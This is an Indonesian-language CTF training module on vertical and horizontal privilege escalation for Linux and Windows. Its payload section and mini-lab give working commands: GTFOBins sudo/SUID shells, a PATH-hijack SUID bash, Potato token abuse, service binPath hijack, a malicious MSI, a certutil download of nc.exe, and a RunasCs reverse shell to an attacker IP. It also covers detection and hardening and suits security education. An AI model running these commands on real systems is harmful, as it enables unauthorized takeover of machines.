# 3. Vertical & Horizontal Privilege Escalation

> Privilege Escalation adalah fase terakhir rantai Boot2Root: setelah dapat *foothold* (akses awal sebagai user terbatas), penyerang menaikkan hak akses sampai **menguasai mesin penuh** — `root` di Linux atau `SYSTEM`/`Administrator` di Windows. Ada dua arah: **vertical** (naik level, mis. `www-data` → `root`) dan **horizontal** (pindah ke akun setara, mis. user `alice` → user `bob`, untuk meraih credential atau akses berkas baru yang jadi batu loncatan). Teknik andalan di CTF LKSN 2026: **Living-Off-The-Land** — menyalahgunakan binary sah yang sudah ada di sistem (**GTFOBins** di Linux, **LOLBAS** di Windows) ditambah misconfig SUID/sudo, service, dan token. Tujuan akhir tetap: baca `root.txt`/`proof.txt`.

## Konsep

PrivEsc bukan satu *exploit* tunggal, melainkan **eksploitasi kepercayaan yang berlebihan**: sistem menjalankan sesuatu dengan hak lebih tinggi daripada yang seharusnya bisa dikendalikan user biasa. Penyerang mencari titik di mana ia bisa menyisipkan kode/perintah ke dalam konteks ber-privilege tersebut.

- **Vertical (privilege elevation)** — naik dari hak rendah ke hak tinggi: `user` → `root`/`SYSTEM`. Inilah yang biasanya membuka flag `root.txt`.
- **Horizontal (lateral)** — pindah ke akun **selevel** untuk mendapat data, credential, atau permukaan baru. Sering jadi *stepping stone*: `alice` → `bob` (yang ternyata anggota `sudo`/`Administrators`) → `root`/`SYSTEM`.

**Living-Off-The-Land (LotL)** adalah filosofi "hidup dari yang sudah ada di tanah ini": alih-alih membawa malware, penyerang memakai **binary bawaan yang ditandatangani & dipercaya** (`find`, `tar`, `python`, `vim` di Linux; `certutil`, `msiexec`, `rundll32` di Windows). Karena binary-nya sah, teknik ini **mengelak AV/EDR** dan memanfaatkan privilege yang melekat pada binary itu. Katalognya: **GTFOBins** (Unix) dan **LOLBAS** (Windows).

## Cara Kerja

Mekanisme yang disalahgunakan berbeda per-OS:

**Linux**

| Vektor | Akar masalah |
|---|---|
| **SUID/SGID binary** | Binary berjalan dengan euid pemilik (`root`); jika ada di GTFOBins → spawn shell ber-root |
| **sudo misconfig** | Entri `NOPASSWD`/wildcard/`secure_path` longgar memberi command ber-root |
| **Linux capabilities** | `cap_setuid`, `cap_dac_read_search` dll. memberi sebagian privilege root tanpa SUID |
| **Cron / scheduled job** | Skrip yang dijalankan `root` tapi **writable** user, atau memakai PATH/wildcard relatif |
| **PATH hijacking** | Skrip ber-privilege memanggil binary tanpa path absolut |
| **Writable `/etc/passwd`, kernel exploit** | Jalur langsung ke root jika file sensitif writable / kernel rentan |

**Windows**

| Vektor | Akar masalah |
|---|---|
| **Token impersonation** | `SeImpersonatePrivilege` memungkinkan "Potato" (PrintSpoofer/GodPotato) mencuri token `SYSTEM` |
| **Service misconfig** | Binary service writable, ACL service longgar (`SERVICE_CHANGE_CONFIG`), atau **unquoted service path** |
| **AlwaysInstallElevated** | Registry mengizinkan instalasi `.msi` apa pun berjalan sebagai `SYSTEM` |
| **DLL hijacking** | Proses ber-privilege memuat DLL dari folder writable |
| **Stored credentials** | Password di registry/Autologon/`cmdkey`, file unattend, `runas /savecred` |
| **UAC bypass** | Naik dari medium → high integrity dalam konteks admin |

## Indikator / Cara Mengenali

Sinyal bahwa sebuah host punya jalur eskalasi:

- `sudo -l` menampilkan entri `(ALL) NOPASSWD:` atau binary yang ada di GTFOBins.
- `find / -perm -4000` menemukan SUID **tidak standar** (mis. `find`, `python`, `nmap`, `cp` ber-SUID).
- `getcap -r /` menemukan capability seperti `cap_setuid+ep` pada interpreter.
- Di Windows, `whoami /priv` menampilkan **`SeImpersonatePrivilege`** atau `SeBackupPrivilege` dalam status *Enabled*.
- `sc qc <svc>` menunjukkan `BINARY_PATH_NAME` tanpa tanda kutip padahal mengandung spasi (*unquoted path*), atau folder binary-nya writable.
- Credential berserakan: `.bash_history`, file `config`/`.env`, `web.config`, `unattend.xml`, key `id_rsa` di home user lain.
- `linpeas`/`winpeas` menyorot temuan dengan warna **merah/kuning** (highlight = kemungkinan tinggi).

## Langkah Eksploitasi

1. **Stabilkan shell.** Upgrade ke TTY penuh (`python3 -c 'import pty;pty.spawn("/bin/bash")'`, lalu `Ctrl-Z` → `stty raw -echo; fg`) agar `sudo`/interaktif jalan.
2. **Enumerasi konteks.** Linux: `id`, `sudo -l`, `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`, cek cron (`cat /etc/crontab`, jalankan `pspy`). Windows: `whoami /priv`, `whoami /groups`, `systeminfo`.
3. **Otomasi enumerasi.** Jalankan `linpeas.sh`/`winPEAS.exe` (atau `PowerUp.ps1 → Invoke-AllChecks`) untuk memetakan semua vektor sekaligus.
4. **Cocokkan ke katalog.** Setiap SUID/sudo binary → cek **GTFOBins**; setiap LOLBin Windows → cek **LOLBAS**. Cari resep "shell/SUID/sudo".
5. **Pivot horizontal bila perlu.** Pakai credential yang ditemukan: `su - bob`, `ssh -i key bob@host`, atau `runas`/`RunasCs.exe` di Windows untuk menempati akun yang lebih kaya privilege.
6. **Eksekusi vektor vertical.** Spawn shell ber-`root`/`SYSTEM` lewat resep yang cocok (lihat *Contoh / Payload*).
7. **Verifikasi & ambil flag.** `id` → `uid=0`, atau `whoami` → `nt authority\system`; baca `root.txt`/`proof.txt`.

## Tools

| Tool | Fungsi singkat |
|---|---|
| **linPEAS / winPEAS** | Enumerasi PrivEsc otomatis lintas vektor (Linux/Windows), highlight temuan |
| **GTFOBins** | Katalog resep abuse binary Unix (SUID/sudo/capabilities/shell) |
| **LOLBAS** | Katalog binary/skrip/library sah Windows untuk download/exec/bypass |
| **pspy** | Pantau proses & cron tanpa root → tangkap job ber-privilege |
| **PowerUp.ps1 / SharpUp / Seatbelt** | Audit misconfig Windows (service, AlwaysInstallElevated, unquoted path) |
| **PrintSpoofer / GodPotato / RoguePotato** | Abuse `SeImpersonatePrivilege` → token `SYSTEM` |
| **BloodHound** | Petakan jalur eskalasi/lateral di Active Directory |
| **linux-exploit-suggester / Metasploit `local_exploit_suggester`** | Saran kernel/local exploit dari versi target |
| **mimikatz / LaZagne** | Dump/scrape credential (Windows) untuk pivot horizontal |

## Contoh / Payload

```bash
# ── LINUX: enumerasi cepat ──────────────────────────────
id; sudo -l
find / -perm -4000 -type f 2>/dev/null      # daftar SUID
getcap -r / 2>/dev/null                       # capabilities

# ── sudo NOPASSWD pada binary GTFOBins → root ───────────
sudo find . -exec /bin/sh \; -quit            # sudo find diizinkan
sudo vim -c ':!/bin/sh'                        # sudo vim
sudo env /bin/sh                               # sudo env
# (sudo less /etc/profile → ketik  !/bin/sh )

# ── SUID binary → root (perhatikan -p agar euid dipertahankan) ──
./find . -exec /bin/sh -p \; -quit            # /usr/bin/find ber-SUID

# ── Linux capability cap_setuid pada python ─────────────
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# ── PATH hijack pada cron/SUID yang panggil binary relatif ──
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /tmp/backup
chmod +x /tmp/backup; export PATH=/tmp:$PATH   # jika skrip root memanggil `backup`

# ── Pivot HORIZONTAL: reuse credential / key ────────────
su - bob                                       # password reuse dari config/.env
ssh -i /home/bob/.ssh/id_rsa bob@127.0.0.1     # private key user lain
```

```powershell
# ── WINDOWS: enumerasi privilege & misconfig ────────────
whoami /priv
whoami /groups
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# ── Token abuse: SeImpersonatePrivilege → SYSTEM ────────
PrintSpoofer64.exe -i -c cmd.exe               # spawn cmd sebagai SYSTEM
GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators bob /add"

# ── Service abuse: binPath bisa diubah (SERVICE_CHANGE_CONFIG) ──
sc qc DodgySvc                                  # cek konfigurasi service
sc config DodgySvc binPath= "cmd /c net localgroup administrators bob /add"
sc stop DodgySvc & sc start DodgySvc            # picu eksekusi sebagai LocalSystem

# ── AlwaysInstallElevated → MSI sebagai SYSTEM ──────────
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# (keduanya harus 0x1) → buat MSI di mesin attacker:
#   msfvenom -p windows/x64/exec CMD='net localgroup administrators bob /add' -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi

# ── LOLBAS: download tool tanpa bawa binary sendiri ─────
certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Temp\nc.exe

# ── Pivot HORIZONTAL dengan credential temuan ───────────
RunasCs.exe bob 'Passw0rd!' "cmd.exe" -r 10.10.14.5:4444
```

> **Catatan penting.** "Potato" (PrintSpoofer/GodPotato) hanya jalan jika `SeImpersonatePrivilege` *Enabled* — umum pada akun service (IIS `iis apppool\`, MSSQL). Flag `-p` pada `/bin/sh`/`/bin/bash` **wajib** agar euid root dari binary SUID tidak di-drop. Selalu **fingerprint versi OS/kernel** sebelum mengandalkan kernel exploit, dan utamakan misconfig (lebih andal, tak bikin crash) sebelum exploit memori.

## Deteksi & Mitigasi

**Perbaikan inti (hardening konfigurasi — fix yang sebenarnya, kaitan ke Modul C):**

- **Audit & minimalkan SUID/SGID** (Linux): `find / -perm -4000 -o -perm -2000` lalu cabut bit yang tak perlu (`chmod -s`), mount partisi data dengan `nosuid,noexec`. Ini langsung mematikan mayoritas resep GTFOBins.
- **Sudoers least privilege**: hindari `NOPASSWD` dan wildcard, set `Defaults secure_path` (memutus PATH hijack), jangan beri editor/interpreter/`find`/`tar` lewat sudo.
- **Windows service hygiene**: perbaiki *unquoted service path* (bungkus tanda kutip), perketat ACL service & folder binary (cek dengan `accesschk.exe -uwcqv`), jalankan service dengan akun ber-privilege minimum.
- **Matikan AlwaysInstallElevated** (set kedua key ke `0`), dan untuk akun service yang **harus** punya `SeImpersonatePrivilege`, **patch** host agar Potato (DCOM/RPC) tidak bisa relay token ke SYSTEM.
- **Anti credential-reuse (lawan horizontal)**: terapkan **LAPS** (password admin lokal unik per-host), rotasi credential, hapus secret dari `unattend.xml`/registry/history. Tutup jalur pivot `su`/`runas`.
- **Patch kernel & komponen** untuk menutup local exploit.

**Deteksi (blue-team — jembatan ke Modul C: Log Forensic & Logging/Auditing):**

- **Process-creation logging**: aktifkan **Sysmon Event ID 1** + Windows Event **4688** (command line), dan `auditd` (rule `execve`) di Linux. Cari **parent-child anomali** ciri LotL: `spoolsv.exe`/`svchost.exe` → `cmd.exe`, atau service `*.exe` men-spawn shell.
- **Tanda enumerasi**: eksekusi `linpeas`/`winpeas`, `whoami /priv`, lonjakan `sudo -l`, `find ... -perm -4000`.
- **Tanda abuse**: penambahan anggota grup admin lokal (**Event ID 4732**), `sc config ... binPath=`, `msiexec /i`, `certutil -urlcache`, eksekusi `.msi`/`rundll32` dengan argumen aneh.
- **File Integrity Monitoring** (AIDE/Sysmon) pada binary SUID, sudoers, dan service binary untuk menangkap perubahan.

## Mini-Lab

**Skenario A — Linux (vertical via GTFOBins).** Anda punya foothold sebagai `www-data`. Eskalasikan ke `root` dan baca `/root/root.txt`.

1. `sudo -l` → output: `(ALL) NOPASSWD: /usr/bin/find`.
2. Buka GTFOBins entri **find**, bagian *Sudo*.
3. Jalankan `sudo find . -exec /bin/sh \; -quit` → shell ber-`uid=0`.
4. `id` memastikan `root`, lalu `cat /root/root.txt` → **flag**.

**Skenario B — Windows (vertical via token abuse).** Foothold sebagai service account IIS. `whoami /priv` menunjukkan `SeImpersonatePrivilege` *Enabled*.

1. Upload `PrintSpoofer64.exe` (lewat LOLBAS `certutil`).
2. Jalankan `PrintSpoofer64.exe -i -c cmd.exe`.
3. Di shell baru: `whoami` → `nt authority\system`.
4. Baca `C:\Users\Administrator\Desktop\root.txt` → **flag**.

**Tantangan tambahan (horizontal):** sebelum eskalasi vertical, temukan password user lain di file `config`/`.env`, pivot dengan `su - <user>` atau `RunasCs.exe`, baru lanjut ke `root`/`SYSTEM`.

## Referensi & Latihan

- **GTFOBins** — katalog abuse binary Unix (SUID/sudo/cap/shell): https://gtfobins.github.io
- **LOLBAS** — katalog binary/skrip sah Windows (download/exec/bypass): https://lolbas-project.github.io
- **HackTricks** — *Linux Privilege Escalation* & *Windows Local Privilege Escalation* (checklist & teknik per-vektor).
- **PayloadsAllTheThings** — bagian *Linux/Windows - Privilege Escalation*.
- **HTB Academy** — modul *Linux Privilege Escalation* & *Windows Privilege Escalation*; mesin latihan klasik: *Lame*, *Optimum*, *Devel*, *Cronos*.
- **TryHackMe** — room *Linux PrivEsc*, *Windows PrivEsc*, *Common Linux Privesc*, *Vulnversity*.
- **pwn.college** — modul *Privilege Escalation* / sandbox & SUID untuk pemahaman dasar.
- **root-me** — kategori *App-System* (eskalasi & abuse binary).

> **Etika:** Hanya gunakan pada lab pribadi, platform latihan resmi, target CTF, atau sistem dengan izin tertulis. Mengeskalasi hak akses pada mesin tanpa izin adalah pelanggaran hukum.
